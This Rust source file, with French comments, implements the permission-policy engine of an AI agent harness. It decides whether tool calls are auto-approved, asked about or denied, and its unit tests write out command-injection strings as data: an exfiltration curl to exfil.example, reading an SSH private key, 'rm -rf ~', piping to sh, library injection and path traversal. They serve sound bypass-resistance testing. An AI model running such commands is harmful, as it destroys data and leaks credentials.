//! Politiques d'autorisation (§8.10) et fenêtres (§9.2).
//!
//! Ordre d'évaluation, du plus spécifique au plus général :
//! 1. règle sur `(outil, motif d'arguments)` ;
//! 2. règle sur l'outil ;
//! 3. règle sur le serveur ;
//! 4. surcharge de configuration par classe de risque ;
//! 5. politique par défaut de la classe.
//!
//! Les annotations d'un serveur MCP sont des **indices** : la surcharge de configuration
//! prévaut toujours.

use penelope_kernel::clock::SharedClock;
use penelope_kernel::risk::{PolicyDecision, PolicyWindow, RiskClass};
use penelope_store::Store;
use penelope_store::rusqlite::params;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::path::{Component, Path, PathBuf};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleScope {
    Global,
    Server,
    Tool,
}

impl RuleScope {
    pub fn as_str(&self) -> &'static str {
        match self {
            RuleScope::Global => "global",
            RuleScope::Server => "server",
            RuleScope::Tool => "tool",
        }
    }
    pub fn parse(s: &str) -> Option<RuleScope> {
        Some(match s {
            "global" => RuleScope::Global,
            "server" => RuleScope::Server,
            "tool" => RuleScope::Tool,
            _ => return None,
        })
    }
    /// Plus la valeur est élevée, plus la règle est spécifique.
    pub fn specificity(&self) -> u8 {
        match self {
            RuleScope::Global => 0,
            RuleScope::Server => 1,
            RuleScope::Tool => 2,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct PolicyRule {
    pub id: String,
    pub scope: RuleScope,
    pub tool: Option<String>,
    pub server: Option<String>,
    /// Motif d'arguments : chaque paire doit correspondre pour que la règle s'applique.
    /// Exemple : `{"project": "penelope"}`.
    pub arg_match: Option<Value>,
    pub decision: PolicyDecision,
    pub window: PolicyWindow,
    /// Identifiant de run ou de session pour les fenêtres bornées.
    pub window_ref: Option<String>,
    pub created_at: String,
    pub revoked_at: Option<String>,
    pub hits: i64,
}

impl PolicyRule {
    /// Vrai si la règle s'applique à cet appel.
    pub fn matches(&self, tool: &str, server: Option<&str>, args: &Value) -> bool {
        self.matches_in(tool, server, args, None)
    }

    fn matches_in(
        &self,
        tool: &str,
        server: Option<&str>,
        args: &Value,
        workspace: Option<&Path>,
    ) -> bool {
        if let Some(t) = &self.tool
            && t != tool
        {
            return false;
        }
        if let Some(s) = &self.server
            && Some(s.as_str()) != server
        {
            return false;
        }
        if let Some(pattern) = &self.arg_match
            && !args_match_in(pattern, args, workspace)
        {
            return false;
        }
        // Le réseau d'une commande ne s'accorde jamais implicitement (issue #106) : une
        // règle sur `shell_exec` qui ne le nomme pas (antérieure, ou sur l'outil entier)
        // ne couvre pas un appel qui le demande.
        if self.tool.as_deref() == Some("shell_exec")
            && args.get("network") == Some(&Value::Bool(true))
            && self.arg_match.as_ref().and_then(|p| p.get("network")) != Some(&Value::Bool(true))
        {
            return false;
        }
        true
    }

    /// Vrai si la fenêtre est encore ouverte dans ce contexte.
    pub fn in_window(&self, run_id: Option<&str>, session_id: Option<&str>) -> bool {
        match self.window {
            PolicyWindow::Always => true,
            PolicyWindow::Run => self.window_ref.as_deref() == run_id && run_id.is_some(),
            PolicyWindow::Session => {
                self.window_ref.as_deref() == session_id && session_id.is_some()
            }
            PolicyWindow::Once => false,
        }
    }
}

/// Correspondance de motif : toutes les clés du motif doivent être présentes et égales.
///
/// Trois opérateurs bornent un « toujours » au contexte de l'appel (issue #67), chacun
/// écrit pour ne pas se contourner :
///
/// - [`CMD_PREFIX_OP`] : famille de commandes, **sans** enchaînement hors guillemets
///   (`;`, `&&`, `|`, `$(…)`, redirection, retour à la ligne), et à la frontière d'un mot ;
/// - [`PATH_PREFIX_OP`] : répertoire, comparé sur le chemin normalisé (`..` résolu) ;
/// - [`ORIGIN_OP`] : schéma et hôte **exacts** d'une URL, jamais un préfixe de texte.
fn args_match_in(pattern: &Value, args: &Value, workspace: Option<&Path>) -> bool {
    if let Value::Object(p) = pattern
        && p.len() == 1
        && let Some((op, Value::String(expected))) = p.iter().next()
    {
        let candidate = args.as_str().unwrap_or_default();
        match op.as_str() {
            CMD_PREFIX_OP => return command_matches(expected, candidate),
            PATH_PREFIX_OP => return path_matches_in(expected, candidate, workspace),
            ORIGIN_OP => return origin_of(candidate).as_deref() == Some(expected.as_str()),
            _ => {}
        }
    }
    match (pattern, args) {
        (Value::Object(p), Value::Object(a)) => p.iter().all(|(k, v)| match a.get(k) {
            Some(av) => args_match_in(v, av, workspace),
            None => false,
        }),
        (p, a) => p == a,
    }
}

/// Famille de commandes (`cargo test`).
pub const CMD_PREFIX_OP: &str = "$cmd_prefix";
/// Répertoire (`src/`), comparé sur le chemin normalisé.
pub const PATH_PREFIX_OP: &str = "$path_prefix";
/// Origine d'une URL (`https://example.com`).
pub const ORIGIN_OP: &str = "$origin";

/// Vrai si `candidate` est une commande de la famille `prefix` : une ligne utilisable
/// (aucun enchaînement, voir [`crate::cmdline`]) dont les premiers mots sont ceux de la
/// famille.
///
/// La comparaison porte sur les **mots**, pas sur le texte : `cargo testament` n'est pas
/// `cargo test` (frontière de mot), et `glab api "p?a=1&b=2"` est bien de la famille
/// `glab` — le `&` y est un caractère d'URL, pas un enchaînement (issue #141). Un tube
/// vers une lecture pure (`… | jq -r '…'`) garde la famille de sa première étape : c'est
/// elle qui agit.
pub fn command_matches(prefix: &str, candidate: &str) -> bool {
    crate::cmdline::pipeline(candidate).is_some_and(|l| family_covers(prefix, &l))
}

/// La même question sur une ligne déjà découpée : les premiers mots sont ceux de la
/// famille. C'est la seule forme utilisable pour une étape de liste, qui n'a pas de texte
/// à elle (issue #150).
pub fn family_covers(prefix: &str, line: &crate::cmdline::Pipeline) -> bool {
    let Some(want) = crate::cmdline::family(prefix) else {
        return false;
    };
    let words = &line.head.words;
    words.len() >= want.len() && words.iter().zip(&want).all(|(a, b)| a == b)
}

/// Étapes d'une liste `a && b`, déjà découpées, quand la ligne en porte plusieurs.
/// `None` pour une ligne simple (chemin ordinaire) ou composée.
///
/// Les étapes ne sont **jamais** réécrites en texte pour être rejugées : les guillemets
/// sont retirés par le découpage, et `--print "%(title)s"` redeviendrait un sous-shell.
/// C'est la règle de #141 — des tokens, jamais du texte reconstruit.
fn separable_steps(args: &Value) -> Option<Vec<crate::cmdline::Pipeline>> {
    let command = args.get("command")?.as_str()?;
    let list = crate::cmdline::list(command)?;
    (list.steps.len() >= 2).then_some(list.steps)
}

#[cfg(test)]
fn path_matches(prefix: &str, candidate: &str) -> bool {
    path_matches_in(prefix, candidate, None)
}

fn path_matches_in(prefix: &str, candidate: &str, workspace: Option<&Path>) -> bool {
    if (Path::new(prefix).is_absolute() && Path::new(candidate).is_absolute())
        || workspace.is_some()
    {
        let resolve = |path: &str| -> Option<PathBuf> {
            let base = if Path::new(path).is_absolute() {
                PathBuf::from("/")
            } else {
                std::fs::canonicalize(workspace?).ok()?
            };
            let mut out = base;
            for component in Path::new(path).components() {
                match component {
                    Component::RootDir | Component::CurDir => {}
                    Component::ParentDir => {
                        out.pop();
                    }
                    Component::Normal(part) => {
                        out.push(part);
                        if let Ok(real) = std::fs::canonicalize(&out) {
                            out = real;
                        }
                    }
                    Component::Prefix(_) => return None,
                }
            }
            Some(out)
        };
        if let (Some(want), Some(got)) = (resolve(prefix), resolve(candidate)) {
            if prefix.is_empty() {
                return got.parent() == Some(want.as_path());
            }
            return got.starts_with(&want);
        }
        return false;
    }
    // `src/../../etc/passwd` commence textuellement par `src/` : la comparaison se fait
    // sur le chemin normalisé, jamais sur le texte brut.
    let norm = normalise_text(candidate);
    let want = normalise_text(prefix);
    if want.is_empty() {
        return !norm.contains('/');
    }
    norm.starts_with(&want)
}

/// Résout `.` et `..` textuellement, sans toucher au disque.
fn normalise_text(p: &str) -> String {
    let absolute = p.starts_with('/');
    let mut out: Vec<&str> = Vec::new();
    for part in p.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                out.pop();
            }
            other => out.push(other),
        }
    }
    let joined = out.join("/");
    let trailing = if p.ends_with('/') && !joined.is_empty() {
        "/"
    } else {
        ""
    };
    format!("{}{joined}{trailing}", if absolute { "/" } else { "" })
}

/// Schéma et hôte d'une URL : `https://example.com/a` donne `https://example.com`.
fn origin_of(url: &str) -> Option<String> {
    if let Some((scheme, rest)) = url.split_once("://") {
        let host = rest.split(['/', '?', '#']).next().unwrap_or_default();
        return (!host.is_empty())
            .then(|| format!("{}://{}", scheme.to_lowercase(), host.to_lowercase()));
    }
    if let Some((user_host, path)) = url.split_once(':')
        && let Some((user, host)) = user_host.split_once('@')
        && !user.is_empty()
        && !host.is_empty()
        && !path.is_empty()
    {
        return Some(format!("ssh://{}", host.to_lowercase()));
    }
    let (owner, repo) = url.split_once('/')?;
    let valid = |part: &str| {
        !part.is_empty()
            && part
                .bytes()
                .all(|c| c.is_ascii_alphanumeric() || c == b'-' || c == b'_')
    };
    (valid(owner) && valid(repo)).then(|| "https://github.com".to_string())
}

/// Motif rendu lisible pour une carte ou `/policies`.
pub fn describe_pattern(pattern: &Value) -> String {
    let Some(obj) = pattern.as_object() else {
        return pattern.to_string();
    };
    obj.iter()
        .map(|(k, v)| match v.as_object().and_then(|o| o.iter().next()) {
            Some((op, val)) if op == CMD_PREFIX_OP => {
                format!("{k} : famille « {} »", val.as_str().unwrap_or_default())
            }
            Some((op, val)) if op == PATH_PREFIX_OP => {
                format!("{k} sous « {} »", val.as_str().unwrap_or_default())
            }
            Some((op, val)) if op == ORIGIN_OP => {
                format!("{k} sur « {} »", val.as_str().unwrap_or_default())
            }
            _ if k == "network" && v == &Value::Bool(true) => "avec réseau".to_string(),
            _ => format!(
                "{k} = {}",
                v.as_str().map(String::from).unwrap_or(v.to_string())
            ),
        })
        .collect::<Vec<_>>()
        .join(", ")
}

/// Décision motivée, pour l'audit et l'affichage.
#[derive(Debug, Clone, PartialEq)]
pub struct Verdict {
    pub decision: PolicyDecision,
    pub risk: RiskClass,
    pub reason: String,
    pub rule_id: Option<String>,
}

#[derive(Clone)]
pub struct PolicyEngine {
    store: Store,
    clock: SharedClock,
}

impl PolicyEngine {
    pub fn new(store: Store, clock: SharedClock) -> Self {
        PolicyEngine { store, clock }
    }

    /// Politique par défaut d'une classe de risque, d'après la configuration.
    pub fn default_for(
        cfg: &penelope_kernel::config::McpPolicy,
        risk: RiskClass,
    ) -> PolicyDecision {
        let s = match risk {
            RiskClass::Read => &cfg.read,
            RiskClass::Write => &cfg.write,
            RiskClass::Destructive => &cfg.destructive,
            RiskClass::External => &cfg.external,
            RiskClass::Unknown => &cfg.unknown,
        };
        PolicyDecision::parse(s).unwrap_or(PolicyDecision::Ask)
    }

    /// Évalue un appel.
    // Chaque paramètre est une colonne du ledger : les regrouper dans une structure
    // ne ferait que déplacer la liste.
    #[allow(clippy::too_many_arguments)]
    pub async fn evaluate(
        &self,
        cfg: &penelope_kernel::config::McpPolicy,
        tool: &str,
        server: Option<&str>,
        args: &Value,
        risk: RiskClass,
        run_id: Option<&str>,
        session_id: Option<&str>,
    ) -> penelope_store::Result<Verdict> {
        self.evaluate_in(cfg, tool, server, args, risk, run_id, session_id, None)
            .await
    }

    /// Évalue les chemins relatifs dans le workspace effectif de l'appel.
    #[allow(clippy::too_many_arguments)]
    pub async fn evaluate_in(
        &self,
        cfg: &penelope_kernel::config::McpPolicy,
        tool: &str,
        server: Option<&str>,
        args: &Value,
        risk: RiskClass,
        run_id: Option<&str>,
        session_id: Option<&str>,
        workspace: Option<&Path>,
    ) -> penelope_store::Result<Verdict> {
        let rules = self.active_rules().await?;
        // Une liste `a && b` n'est couverte par aucune règle seule : elle l'est quand
        // **chaque** étape l'est (issue #150). Les étapes sont jugées une par une, avec
        // les mêmes règles et le même réseau ; il suffit qu'une seule manque pour que la
        // ligne entière reparte en carte.
        if tool == "shell_exec"
            && let Some(steps) = separable_steps(args)
            && let Some(v) = self
                .cover_each_step(cfg, &rules, &steps, args, risk, run_id, session_id)
                .await?
        {
            return Ok(v);
        }
        let mut best: Option<&PolicyRule> = None;
        for r in &rules {
            if !r.matches_in(tool, server, args, workspace) {
                continue;
            }
            if !r.in_window(run_id, session_id) {
                continue;
            }
            let better = match best {
                None => true,
                Some(b) => {
                    (r.scope.specificity(), r.arg_match.is_some())
                        > (b.scope.specificity(), b.arg_match.is_some())
                }
            };
            if better {
                best = Some(r);
            }
        }

        if let Some(r) = best {
            let id = r.id.clone();
            self.bump(&id).await?;
            return Ok(Verdict {
                decision: r.decision,
                risk,
                reason: format!(
                    "règle {} ({}, fenêtre {})",
                    r.id,
                    r.scope.as_str(),
                    r.window.as_str()
                ),
                rule_id: Some(id),
            });
        }

        Ok(Verdict {
            decision: Self::default_for(cfg, risk),
            risk,
            reason: format!("politique par défaut pour la classe `{}`", risk.as_str()),
            rule_id: None,
        })
    }

    /// Vérifie qu'une règle couvre chaque étape d'une liste. `None` : ce n'est pas le
    /// cas, l'appel suit le chemin ordinaire (donc la politique par défaut, donc la
    /// carte). Une étape de lecture pure ne demande rien (#111).
    #[allow(clippy::too_many_arguments)]
    async fn cover_each_step(
        &self,
        _cfg: &penelope_kernel::config::McpPolicy,
        rules: &[PolicyRule],
        steps: &[crate::cmdline::Pipeline],
        args: &Value,
        risk: RiskClass,
        run_id: Option<&str>,
        session_id: Option<&str>,
    ) -> penelope_store::Result<Option<Verdict>> {
        let network = args.get("network") == Some(&Value::Bool(true));
        let mut used: Vec<String> = Vec::new();
        for step in steps {
            if crate::cmdline::needs_no_rule(step) {
                continue;
            }
            let mut found: Option<&PolicyRule> = None;
            for r in rules {
                if r.tool.as_deref() != Some("shell_exec") || !r.in_window(run_id, session_id) {
                    continue;
                }
                // La règle doit nommer une famille : une règle sur l'outil entier ne
                // couvre pas une étape (elle aurait déjà répondu au chemin ordinaire).
                let Some(pattern) = &r.arg_match else {
                    continue;
                };
                let Some(prefix) = pattern["command"][CMD_PREFIX_OP].as_str() else {
                    continue;
                };
                if !family_covers(prefix, step) {
                    continue;
                }
                // Le réseau ne s'hérite jamais (#106) : une règle qui ne le nomme pas ne
                // couvre pas une ligne qui le demande.
                if network && pattern.get("network") != Some(&Value::Bool(true)) {
                    continue;
                }
                // Une seule étape refusée suffit à refuser la ligne : on ne fabrique pas
                // un « autorisé » à partir de règles qui disent non.
                if r.decision != PolicyDecision::Auto {
                    return Ok(None);
                }
                found = Some(r);
                break;
            }
            let Some(r) = found else {
                return Ok(None);
            };
            if !used.contains(&r.id) {
                used.push(r.id.clone());
            }
        }
        // Aucune étape n'a demandé de règle : la ligne est une suite de lectures, la
        // politique par défaut de la classe `read` s'en charge comme d'habitude.
        if used.is_empty() {
            return Ok(None);
        }
        for id in &used {
            self.bump(id).await?;
        }
        Ok(Some(Verdict {
            decision: PolicyDecision::Auto,
            risk,
            reason: format!("règles {} (chaque étape de la liste)", used.join(", ")),
            rule_id: used.first().cloned(),
        }))
    }

    /// Crée une règle à partir d'une décision « toujours », « pour ce run » ou
    /// « pour cette session ».
    // Chaque paramètre est une colonne du ledger : les regrouper dans une structure
    // ne ferait que déplacer la liste.
    #[allow(clippy::too_many_arguments)]
    pub async fn create_rule(
        &self,
        scope: RuleScope,
        tool: Option<&str>,
        server: Option<&str>,
        arg_match: Option<Value>,
        decision: PolicyDecision,
        window: PolicyWindow,
        window_ref: Option<&str>,
    ) -> penelope_store::Result<PolicyRule> {
        let rule = PolicyRule {
            id: format!("p_{}", penelope_kernel::ids::Ulid::new()),
            scope,
            tool: tool.map(String::from),
            server: server.map(String::from),
            arg_match,
            decision,
            window,
            window_ref: window_ref.map(String::from),
            created_at: self.clock.now_rfc3339(),
            revoked_at: None,
            hits: 0,
        };
        let row = rule.clone();
        self.store
            .write(move |tx| {
                tx.execute(
                    "INSERT INTO policies(id, scope, tool, server, arg_match, decision, window,
                        window_ref, created_at)
                     VALUES(?1,?2,?3,?4,?5,?6,?7,?8,?9)",
                    params![
                        row.id,
                        row.scope.as_str(),
                        row.tool,
                        row.server,
                        row.arg_match.as_ref().map(|v| v.to_string()),
                        row.decision.as_str(),
                        row.window.as_str(),
                        row.window_ref,
                        row.created_at
                    ],
                )?;
                Ok(())
            })
            .await?;
        Ok(rule)
    }

    /// Révoque une règle (`/policies`).
    pub async fn revoke(&self, id: &str) -> penelope_store::Result<bool> {
        let (id, now) = (id.to_string(), self.clock.now_rfc3339());
        self.store
            .write(move |tx| {
                Ok(tx.execute(
                    "UPDATE policies SET revoked_at=?2 WHERE id=?1 AND revoked_at IS NULL",
                    params![id, now],
                )? > 0)
            })
            .await
    }

    /// Révoque toutes les règles bornées à un run ou une session terminés.
    pub async fn revoke_window(
        &self,
        window: PolicyWindow,
        reference: &str,
    ) -> penelope_store::Result<usize> {
        let (w, r, now) = (
            window.as_str().to_string(),
            reference.to_string(),
            self.clock.now_rfc3339(),
        );
        self.store
            .write(move |tx| {
                Ok(tx.execute(
                    "UPDATE policies SET revoked_at=?3
                     WHERE window=?1 AND window_ref=?2 AND revoked_at IS NULL",
                    params![w, r, now],
                )?)
            })
            .await
    }

    pub async fn active_rules(&self) -> penelope_store::Result<Vec<PolicyRule>> {
        self.store
            .read(|c| {
                let mut st = c.prepare(
                    "SELECT id, scope, tool, server, arg_match, decision, window, window_ref,
                            created_at, revoked_at, hits
                     FROM policies WHERE revoked_at IS NULL ORDER BY created_at",
                )?;
                let rows = st.query_map([], row_to_rule)?;
                let mut v = Vec::new();
                for r in rows {
                    v.push(r?);
                }
                Ok(v)
            })
            .await
    }

    async fn bump(&self, id: &str) -> penelope_store::Result<()> {
        let id = id.to_string();
        self.store
            .write(move |tx| {
                tx.execute("UPDATE policies SET hits = hits + 1 WHERE id = ?1", [id])?;
                Ok(())
            })
            .await
    }
}

fn row_to_rule(
    r: &penelope_store::rusqlite::Row<'_>,
) -> penelope_store::rusqlite::Result<PolicyRule> {
    let scope: String = r.get(1)?;
    let arg_match: Option<String> = r.get(4)?;
    let decision: String = r.get(5)?;
    let window: String = r.get(6)?;
    Ok(PolicyRule {
        id: r.get(0)?,
        scope: RuleScope::parse(&scope).unwrap_or(RuleScope::Global),
        tool: r.get(2)?,
        server: r.get(3)?,
        arg_match: arg_match.and_then(|s| serde_json::from_str(&s).ok()),
        decision: PolicyDecision::parse(&decision).unwrap_or(PolicyDecision::Ask),
        window: PolicyWindow::parse(&window).unwrap_or(PolicyWindow::Always),
        window_ref: r.get(7)?,
        created_at: r.get(8)?,
        revoked_at: r.get(9)?,
        hits: r.get(10)?,
    })
}

#[cfg(test)]
mod tests {

    /// #67 (revue de sécurité) : les trois opérateurs de motif ne se contournent pas.
    #[test]
    fn pattern_operators_cannot_be_tricked() {
        // Commandes : enchaînement, substitution, redirection, mot plus long.
        assert!(command_matches(
            "cargo test",
            "cargo test -p penelope-kernel"
        ));
        assert!(command_matches("cargo test", "cargo test"));
        for detour in [
            "cargo test; rm -rf ~",
            "cargo test && curl https://exfil.example",
            "cargo test | tee /tmp/x",
            "cargo test `cat ~/.ssh/id_ed25519`",
            "cargo test $(whoami)",
            "cargo test > /tmp/vol",
            "cargo test\nrm -rf ~",
            "cargo testament",
            "cargotest",
        ] {
            assert!(!command_matches("cargo test", detour), "{detour}");
        }

        // #141 : entre guillemets, `&` et `|` sont des caractères. Une URL de requête est
        // de la famille de son programme, une affectation anodine ne l'en sort pas, et
        // une famille faite d'affectations ne couvre rien.
        assert!(command_matches(
            "glab",
            "glab api --hostname h \"p?a=1&b=2\""
        ));
        assert!(command_matches(
            "glab api",
            "GITLAB_HOST=h glab api \"p?x=1\""
        ));
        assert!(command_matches("jq", "jq -r '.[] | .path' data.json"));
        // Le tube vers une lecture pure garde la famille de sa première étape.
        assert!(command_matches(
            "glab",
            "glab api h \"p\" | jq -r '.[].path'"
        ));
        assert!(command_matches("cargo test", "cargo test | grep -c ok"));
        for detour in [
            "glab api h \"p\" | sh",
            "glab api h \"p\" | tee /tmp/x",
            "glab api h \"p\"; rm -rf ~",
            "DYLD_INSERT_LIBRARIES=x.dylib glab api \"p\"",
            "glabber api",
        ] {
            assert!(!command_matches("glab", detour), "{detour}");
        }
        for useless in ["GITLAB_HOST=gitlab.apnl.tech", "", "cd /x && ls"] {
            assert!(
                !command_matches(useless, "GITLAB_HOST=gitlab.apnl.tech glab api \"p\""),
                "{useless:?}"
            );
        }

        // Chemins : `..` résolu avant comparaison.
        assert!(path_matches("src/", "src/b.rs"));
        assert!(path_matches("src/", "./src/sous/c.rs"));
        assert!(!path_matches("src/", "src/../../.zshrc"));
        assert!(!path_matches("src/", "autre/b.rs"));
        assert!(path_matches("/etc/app/", "/etc/app/conf"));
        assert!(!path_matches("/etc/app/", "/etc/app/../shadow"));

        // Origine : hôte exact, casse ignorée.
        assert!(origin_of("https://example.com/a?b=1").as_deref() == Some("https://example.com"));
        assert!(origin_of("HTTPS://Example.COM/a").as_deref() == Some("https://example.com"));
        assert!(origin_of("pas-une-url").is_none());
    }

    #[test]
    fn clone_origin_pattern_understands_scp_and_github_shortcuts() {
        assert!(args_match_in(
            &json!({"url":{ORIGIN_OP:"ssh://github.com"}}),
            &json!({"url":"git@github.com:o/r.git"}),
            None,
        ));
        assert!(args_match_in(
            &json!({"url":{ORIGIN_OP:"https://github.com"}}),
            &json!({"url":"Fidelatoo/imap"}),
            None,
        ));
        assert!(!args_match_in(
            &json!({"url":{ORIGIN_OP:"https://github.com"}}),
            &json!({"url":"../imap"}),
            None,
        ));
    }
    use super::*;
    use penelope_kernel::clock::TestClock;
    use penelope_kernel::config::McpPolicy;
    use serde_json::json;
    use std::sync::Arc;

    #[test]
    fn path_rule_uses_workspace_filesystem_case_and_refuses_symlink_escape() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("workspace");
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src/a.rs"), "x").unwrap();
        let alias = root.join("Src/a.rs");
        let same_file = std::fs::canonicalize(&alias).is_ok();
        assert_eq!(path_matches_in("src/", "Src/a.rs", Some(&root)), same_file);
        assert!(path_matches_in("src/", "src/a.rs", Some(&root)));
        assert!(path_matches_in("", "a.rs", Some(&root)));
        assert!(!path_matches_in("", "src/a.rs", Some(&root)));
        assert!(!path_matches_in("src/", "src/../../outside", Some(&root)));
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(dir.path(), root.join("src/link")).unwrap();
            assert!(!path_matches_in("src/", "src/link/outside", Some(&root)));
        }
    }

    #[tokio::test]
    async fn evaluation_resolves_relative_path_rule_in_workspace() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("workspace");
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src/a.rs"), "x").unwrap();
        let engine = engine();
        engine
            .create_rule(
                RuleScope::Tool,
                Some("fs_write"),
                None,
                Some(json!({"path": {PATH_PREFIX_OP: "src/"}})),
                PolicyDecision::Auto,
                PolicyWindow::Always,
                None,
            )
            .await
            .unwrap();
        let cfg = McpPolicy::default();
        let verdict = |path: &'static str| {
            let engine = &engine;
            let cfg = &cfg;
            let root = &root;
            async move {
                engine
                    .evaluate_in(
                        cfg,
                        "fs_write",
                        None,
                        &json!({"path": path}),
                        RiskClass::Write,
                        None,
                        None,
                        Some(root),
                    )
                    .await
                    .unwrap()
                    .decision
            }
        };
        let alias_is_real = std::fs::canonicalize(root.join("Src/a.rs")).is_ok();
        assert_eq!(
            verdict("Src/a.rs").await == PolicyDecision::Auto,
            alias_is_real
        );
        assert_eq!(verdict("src/a.rs").await, PolicyDecision::Auto);
        assert_ne!(verdict("src/../../outside").await, PolicyDecision::Auto);
    }

    fn engine() -> PolicyEngine {
        PolicyEngine::new(
            Store::open_memory().unwrap(),
            Arc::new(TestClock::default()),
        )
    }

    #[tokio::test]
    async fn defaults_follow_the_prd_table() {
        let cfg = McpPolicy::default();
        assert_eq!(
            PolicyEngine::default_for(&cfg, RiskClass::Read),
            PolicyDecision::Auto
        );
        assert_eq!(
            PolicyEngine::default_for(&cfg, RiskClass::Write),
            PolicyDecision::Ask
        );
        assert_eq!(
            PolicyEngine::default_for(&cfg, RiskClass::Destructive),
            PolicyDecision::AskTwice
        );
        assert_eq!(
            PolicyEngine::default_for(&cfg, RiskClass::External),
            PolicyDecision::Ask
        );
        assert_eq!(
            PolicyEngine::default_for(&cfg, RiskClass::Unknown),
            PolicyDecision::Ask
        );
    }

    /// CA 9 : une règle « toujours » est appliquée au prochain appel identique, puis
    /// révoquée par `/policies`.
    #[tokio::test]
    async fn ca_9_3_always_rule_applies_then_is_revocable() {
        let e = engine();
        let cfg = McpPolicy::default();
        let args = json!({"project":"penelope","title":"fix"});

        let v = e
            .evaluate(
                &cfg,
                "mcp__forge__create_issue",
                Some("forge"),
                &args,
                RiskClass::Write,
                None,
                None,
            )
            .await
            .unwrap();
        assert_eq!(v.decision, PolicyDecision::Ask);

        let rule = e
            .create_rule(
                RuleScope::Tool,
                Some("mcp__forge__create_issue"),
                Some("forge"),
                Some(json!({"project":"penelope"})),
                PolicyDecision::Auto,
                PolicyWindow::Always,
                None,
            )
            .await
            .unwrap();

        let v = e
            .evaluate(
                &cfg,
                "mcp__forge__create_issue",
                Some("forge"),
                &args,
                RiskClass::Write,
                None,
                None,
            )
            .await
            .unwrap();
        assert_eq!(v.decision, PolicyDecision::Auto);
        assert_eq!(v.rule_id.as_deref(), Some(rule.id.as_str()));

        // Un autre projet ne bénéficie pas de la règle.
        let v = e
            .evaluate(
                &cfg,
                "mcp__forge__create_issue",
                Some("forge"),
                &json!({"project":"autre"}),
                RiskClass::Write,
                None,
                None,
            )
            .await
            .unwrap();
        assert_eq!(v.decision, PolicyDecision::Ask);

        assert!(e.revoke(&rule.id).await.unwrap());
        let v = e
            .evaluate(
                &cfg,
                "mcp__forge__create_issue",
                Some("forge"),
                &args,
                RiskClass::Write,
                None,
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            v.decision,
            PolicyDecision::Ask,
            "la règle révoquée ne s'applique plus"
        );
    }

    #[tokio::test]
    async fn more_specific_rule_wins() {
        let e = engine();
        let cfg = McpPolicy::default();
        e.create_rule(
            RuleScope::Server,
            None,
            Some("forge"),
            None,
            PolicyDecision::Auto,
            PolicyWindow::Always,
            None,
        )
        .await
        .unwrap();
        e.create_rule(
            RuleScope::Tool,
            Some("mcp__forge__delete_repo"),
            Some("forge"),
            None,
            PolicyDecision::Deny,
            PolicyWindow::Always,
            None,
        )
        .await
        .unwrap();

        let v = e
            .evaluate(
                &cfg,
                "mcp__forge__delete_repo",
                Some("forge"),
                &json!({}),
                RiskClass::Destructive,
                None,
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            v.decision,
            PolicyDecision::Deny,
            "la règle d'outil prime sur celle de serveur"
        );
    }

    #[tokio::test]
    async fn run_window_is_scoped_to_that_run() {
        let e = engine();
        let cfg = McpPolicy::default();
        e.create_rule(
            RuleScope::Tool,
            Some("shell_exec"),
            None,
            None,
            PolicyDecision::Auto,
            PolicyWindow::Run,
            Some("r1"),
        )
        .await
        .unwrap();

        let v = e
            .evaluate(
                &cfg,
                "shell_exec",
                None,
                &json!({}),
                RiskClass::Write,
                Some("r1"),
                None,
            )
            .await
            .unwrap();
        assert_eq!(v.decision, PolicyDecision::Auto);

        let v = e
            .evaluate(
                &cfg,
                "shell_exec",
                None,
                &json!({}),
                RiskClass::Write,
                Some("r2"),
                None,
            )
            .await
            .unwrap();
        assert_eq!(
            v.decision,
            PolicyDecision::Ask,
            "un autre run n'hérite de rien"
        );
    }

    #[tokio::test]
    async fn once_window_never_matches_later() {
        let e = engine();
        let cfg = McpPolicy::default();
        e.create_rule(
            RuleScope::Tool,
            Some("t"),
            None,
            None,
            PolicyDecision::Auto,
            PolicyWindow::Once,
            None,
        )
        .await
        .unwrap();
        let v = e
            .evaluate(&cfg, "t", None, &json!({}), RiskClass::Write, None, None)
            .await
            .unwrap();
        assert_eq!(v.decision, PolicyDecision::Ask);
    }

    #[tokio::test]
    async fn window_revocation_on_run_end() {
        let e = engine();
        e.create_rule(
            RuleScope::Tool,
            Some("t"),
            None,
            None,
            PolicyDecision::Auto,
            PolicyWindow::Run,
            Some("r1"),
        )
        .await
        .unwrap();
        assert_eq!(e.active_rules().await.unwrap().len(), 1);
        assert_eq!(e.revoke_window(PolicyWindow::Run, "r1").await.unwrap(), 1);
        assert!(e.active_rules().await.unwrap().is_empty());
    }

    #[test]
    fn nested_argument_patterns() {
        let r = PolicyRule {
            id: "x".into(),
            scope: RuleScope::Tool,
            tool: Some("t".into()),
            server: None,
            arg_match: Some(json!({"repo":{"owner":"moi"}})),
            decision: PolicyDecision::Auto,
            window: PolicyWindow::Always,
            window_ref: None,
            created_at: String::new(),
            revoked_at: None,
            hits: 0,
        };
        assert!(r.matches("t", None, &json!({"repo":{"owner":"moi","name":"x"}})));
        assert!(!r.matches("t", None, &json!({"repo":{"owner":"autre"}})));
        assert!(!r.matches("t", None, &json!({})));
    }

    #[test]
    fn annotations_never_override_configuration() {
        // La classe de risque vient du harnais ; la règle ne dépend pas des annotations
        // du serveur. Ici, même pour un outil annoncé `readOnly`, une règle `deny`
        // s'applique.
        let r = PolicyRule {
            id: "x".into(),
            scope: RuleScope::Tool,
            tool: Some("mcp__x__read".into()),
            server: None,
            arg_match: None,
            decision: PolicyDecision::Deny,
            window: PolicyWindow::Always,
            window_ref: None,
            created_at: String::new(),
            revoked_at: None,
            hits: 0,
        };
        assert!(r.matches("mcp__x__read", None, &json!({})));
        assert_eq!(r.decision, PolicyDecision::Deny);
    }
}
